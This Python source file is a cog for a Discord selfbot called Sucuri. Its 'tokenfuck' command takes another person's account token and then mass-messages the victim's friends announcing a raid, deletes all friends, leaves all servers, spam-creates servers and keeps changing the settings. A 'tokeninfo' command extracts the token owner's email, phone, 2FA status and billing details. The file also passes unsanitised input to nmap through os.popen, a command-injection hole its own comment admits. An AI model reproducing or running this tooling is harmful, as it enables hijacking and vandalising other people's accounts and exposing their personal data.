import asyncio, threading, pythonping, socket
from Sucuri.util import *
from discord.ext import commands
from random import randint, choice
from datetime import datetime
from timeit import default_timer as timer


languages = {
    'da'    : 'Danish, Denmark',
    'de'    : 'German, Germany',
    'en-GB' : 'English, United Kingdom',
    'en-US' : 'English, United States',
    'es-ES' : 'Spanish, Spain',
    'fr'    : 'French, France',
    'hr'    : 'Croatian, Croatia',
    'lt'    : 'Lithuanian, Lithuania',
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
}

badge_flags = {
    1: 'Staff',
    2: 'partner',
    4: 'HypeSquad',
    8: 'Bug Hunter',
    64: 'House of Bravery',
    128: 'House of Brilliance',
    256: 'House of Balance',
    512: 'Early supporter',
    1024: 'Team user',
    4096: 'System',
    16384: 'Bug Hunter Level 2',
    65536: 'Verified bot',
    131072: 'Verified bot developer',
    262144: 'Discord Certified Moderator'
}

async def massfrienddm(token, msg=None):
    req = requests.get('https://discord.com/api/v9/users/@me/relationships', headers={'authorization': token})
    friends = req.json() if req.status_code == 200 else None
    if friends == None: return
    else:
        for friend in friends:
            friend_id = friend['id']
            friend_username = friend['user']['username']

            msg = f'Sup {friend_username}, if you see this message it means this account was raided using the Sucuri selfbot :)' if msg is None else msg
            re = requests.post(f'https://discord.com/api/v9/channels/{friend_id}/messages', headers={'authorization': token}, data={'content': msg})
            if re.status_code == 429: # we need to sleep a bit, else the token gets banned
                await asyncio.sleep(20) # sleeps for 20 seconds
                requests.post(f'https://discord.com/api/v9/channels/{friend_id}/messages', headers={'authorization': token}, data={'content': msg}) # lets try again
            else:
                await asyncio.sleep(1)

async def massfrienddel(token):
    req = requests.get('https://discord.com/api/v9/users/@me/relationships', headers={'authorization': token})
    friends = req.json() if req.status_code == 200 else None
    if friends == None: return
    else:
        for friend in friends:
            friend_id = friend['id']

            re = requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend_id}', headers={'authorization': token})
            if re.status_code == 429:
                await asyncio.sleep(20)
                requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{friend_id}', headers={'authorization': token})
            else:
                await asyncio.sleep(1)

async def massguildleave(token):
    req = requests.get('https://discord.com/api/v9/users/@me/guilds', headers={'authorization': token})
    guilds = req.json() if req.status_code == 200 else None
    if guilds == None: return
    else:
        for guild in guilds:
            guild_id = guild['id']

            re = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild_id}', headers={'authorization': token})
            if re.status_code == 429:
                await asyncio.sleep(20)
                requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{guild_id}', headers={'authorization': token}) # lets try again
            else:
                await asyncio.sleep(1)

async def massguildcreate(token, servname):
    for _ in range(100):
        payload = {'name': servname, 'region': 'europe', 'icon': None, 'channels': None}
        re = requests.post('https://discord.com/api/v9/guilds', headers={'authorization': token}, json=payload)
        if re.status_code == 429:
            await asyncio.sleep(20)
            requests.post('https://discord.com/api/v9/guilds', headers={'authorization': token}, json=payload)
        else:
            await asyncio.sleep(1)

async def themeandlocalechanger(token):
    while 1:
        setting = {'theme': choice(['light', 'dark']), 'locale': choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se', 'en-GB'])}
        re = requests.patch("https://discord.com/api/v9/users/@me/settings", headers={'authorization': token}, json=setting)
        if re.status_code == 429:
            await asyncio.sleep(20)
            re = requests.patch("https://discord.com/api/v9/users/@me/settings", headers={'authorization': token}, json=setting)
        else:
            await asyncio.sleep(1)

class hecker_cog(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.command(aliases=['tokenfuck', 'tokenfucker'])
    async def tokenfuckcmd(self, ctx, token, *, message=None):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()
            
            thr = threading.Thread(target=massfrienddm, args=(token, message,), daemon=True).start()
            thr.join()
            threading.Thread(target=massfrienddel, args=(token,), daemon=True).start()
            threading.Thread(target=massguildleave, args=(token,), daemon=True).start()
            threading.Thread(target=massguildcreate, args=(token,), daemon=True).start()
            threading.Thread(target=themeandlocalechanger, args=(token,), daemon=True).start()

            embed = make_embed(
                title='Token fucker',
                values=[('Status', 'Started', False)] 
            )

            await ctx.send(embed=embed[1], delete_after=20.0) if embed[0] else await ctx.send(embed[1], delete_after=20.0)
        else:
            pass
    
    @commands.command(name='tokeninfo')
    async def tokeninfocmd(self, ctx, token):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()

            headers = {
                'Authorization': token,
                'Content-Type': 'application/json',
            }

            req = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers)
            if req.status_code == 401: return print(f'{grey}[{white}{datetime.now().strftime("%H:%M:%S")}{grey}] {give_color()}Invalid token: {white}{ctx.message.content}{reset}')

            r_json = req.json()

            badges = ''
            for key, value in badge_flags.items():
                if (req.json()['flags'] & key) == key: badges += f'{value}\n'
                else: pass

            creation_date = datetime.utcfromtimestamp((( int(r_json['id']) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=headers)
            nitro_data = res.json()
            has_nitro = bool(len(nitro_data) > 0)

            if requests.get(f'https://cdn.discordapp.com/avatars/{r_json["id"]}/{r_json["avatar"]}.jpg').status_code not in [404, 415]:
                pfp_url = f'https://cdn.discordapp.com/avatars/{r_json["id"]}/{r_json["avatar"]}.jpg'
            elif requests.get(f'https://cdn.discordapp.com/avatars/{r_json["id"]}/{r_json["avatar"]}.gif').status_code not in [404, 415]:
                pfp_url = f'https://cdn.discordapp.com/avatars/{r_json["id"]}/{r_json["avatar"]}.gif'
            else:
                pfp_url = 'https://api.creavite.co/out/ea8ce8f1-0209-42bf-a02a-2a38040c36bc_standard.gif'
            
            if requests.get(f'https://cdn.discordapp.com/banners/{r_json["id"]}/{r_json["banner"]}.jpg').status_code not in [404, 415]:
                banner_url = f'https://cdn.discordapp.com/banners/{r_json["id"]}/{r_json["banner"]}.jpg'
            elif requests.get(f'https://cdn.discordapp.com/banners/{r_json["id"]}/{r_json["banner"]}.gif').status_code not in [404, 415]:
                banner_url = f'https://cdn.discordapp.com/banners/{r_json["id"]}/{r_json["banner"]}.gif'
            else:
                banner_url = 'https://api.creavite.co/out/767388b3-2b3b-4f73-8679-4ce27ab16fb9_standard.gif'

            if has_nitro:
                d1 = datetime.strptime(nitro_data[0]['current_period_end'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                d2 = datetime.strptime(nitro_data[0]['current_period_start'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                days_left = abs((d2 - d1).days)

            next_line = '\n'
            
            embed = make_embed(
                title='Token info',
                thumbnail=pfp_url,
                image=banner_url,
                values=[
                    ('User info', f'''```
Username: {r_json["username"]}#{r_json["discriminator"]}
User ID: {r_json["id"]}
Creation date: {str(creation_date)}
Badges: {badges}
Email: {r_json["email"]}
Phone: {r_json["phone"]}
Locale: {r_json["locale"]}, {languages[r_json["locale"]]}
```''', False),

                    ('Account security', f'''```
2FA Enabled: {r_json["mfa_enabled"]}
Is verified: {r_json["verified"]}
```''', False),

                    ('Nitro Info', f'''```
Has nitro: {str(has_nitro)}{f"{next_line}Expires in: "+days_left+" day(s)" if has_nitro else ""}
```''', False)
                ] 
            )

            await ctx.send(embed=embed[1], delete_after=20.0) if embed[0] else await ctx.send(embed[1], delete_after=20.0)
        else:
            pass
    
    @commands.command(name='ping')
    async def pingcmd(self, ctx, host):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()
            
            response = pythonping.ping(host)

            embed = make_embed(
                title='ICMP ping',
                values=[('Host', host, False),
                ('Packet loss', response.packet_loss, True),
                ('Packets lost', response.packets_lost, True),
                ('Round Trip Time (min)', f'{response.rtt_min_ms} ms', False),
                ('Round Trip Time (max)', f'{response.rtt_max_ms} ms', False),
                ('Round Trip Time (avg)', f'{response.rtt_avg_ms} ms', False)] 
            )

            await ctx.send(embed=embed[1]) if embed[0] else await ctx.send(embed[1])
        else:
            pass
    
    @commands.command(name='tcpping')
    async def tcppcmd(self, ctx, host, port):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()


            passed = 0
            success = False
            failed = 0
            full_ping = ''
            count = 0
            
            embed = make_embed(
                title='TCP Ping',
                values=[('Status', 'Currently pinging, hold on.', False),
                ('Host', host, True), ('Port', port, True)] 
            )

            msg = await ctx.send(embed=embed[1]) if embed[0] else await ctx.send(embed[1])

            for _ in range(4):
                count += 1

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)

                s_start = timer()

                try:
                    s.connect((host, int(port)))
                    s.shutdown(socket.SHUT_RD)

                    success = True
                except socket.timeout:
                    full_ping += f'Connection timed out.'
                    failed += 1
                except OSError:
                    full_ping += f'OS Error.'
                    failed += 1

                s_stop = timer()
                s_runtime = "%.2f" % (1000 * (s_stop - s_start))

                if success:
                    full_ping += f'Connected to {host}[{port}]: tcp_seq={(count-1)} time={s_runtime} ms\n'
                    passed += 1

                await asyncio.sleep(1)
                
            lRate = 0
            if failed != 0:
                lRate = failed / (count) * 100
                lRate = "%.2f" % lRate

            embed = make_embed(
                title='TCP ping',
                values=[('Status', 'Finished', False),
                ('Host', host, True), ('Port', port, True),
                ('Total Connections', str(count), False),
                ('Passed Connections', str(passed), False),
                ('Failed Connections', str(failed), False),
                ('Failed %', str(lRate), False),
                ('Full Output', full_ping, False)] 
            )

            await msg.edit(embed=embed[1], delete_after=20.0) if embed[0] else await msg.edit(content=embed[1], delete_after=20.0)
        else:
            pass
    
    @commands.command(aliases=['pscan', 'portscan', 'nmap'])
    async def pscancmd(self, ctx, host, *, extra_args=None):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()
            
            # weird fix, but eh
            if extra_args is None: extra_args = ''
            else: extra_args = f' {extra_args}'

            embed = make_embed(
                title='Port Scan',
                values=[('Status', 'Currently probing for open ports, hold on.', False),
                ('Host', host, False)] 
            )

            msg = await ctx.send(embed=embed[1]) if embed[0] else await ctx.send(embed[1])

            response = os.popen(f'cd Sucuri/tools/nmap-7.92 && nmap.exe {host}{extra_args}') # execute file, vulnerable to rce if you allow other persons to use your bot

            embed = make_embed(
                title='Port Scan',
                values=[('Status', 'Finished', False),
                ('Host', host, False),
                ('Result', str(response.read()), False)] 
            )

            await msg.edit(embed=embed[1], delete_after=20.0) if embed[0] else await msg.edit(content=embed[1], delete_after=20.0)
        else:
            pass
    
    @commands.command(aliases=['geo', 'ipgeo', 'geoip', 'iplookup'])
    async def geoipcmd(self, ctx, host):
        if self.client.user.id == ctx.message.author.id:
            await asyncio.sleep(float(f'0.{randint(0, 5)}'))
            await ctx.message.delete()

            response = requests.get(f'http://ip-api.com/json/{host}')
            if response.status_code != 200:
                embed = make_embed(title='IP Geolocation', values=[('Status', 'Failed', False)])
                return

            r_json = response.json()

            embed = make_embed(
                title='IP Geolocation',
                values=[('Status', 'Success', False),
                ('Host', r_json['query'], False),
                ('📡 ISP', r_json['isp'], True), ('👨‍💼 Organization', r_json['org'], True), ('📑 ASN', r_json['as'], True),
                ('🌐 Region', f"{r_json['region']}/{r_json['regionName']}", True), ('🌐 Country', r_json['country'], True), ('🏙️ City', r_json['city'], True),
                ('⏰ Timezone', f"{r_json['timezone']}/{r_json['regionName']}", True), ('📯 ZIP Code', r_json['zip'], False), 
                ('🗺 Latitude', r_json['lat'], True), ('🗺️ Longitude', r_json['lon'], True)] 
            )

            await ctx.send(embed=embed[1], delete_after=20.0) if embed[0] else await ctx.send(content=embed[1], delete_after=20.0)
        else:
            pass

def setup(bot):
    bot.add_cog(hecker_cog(bot))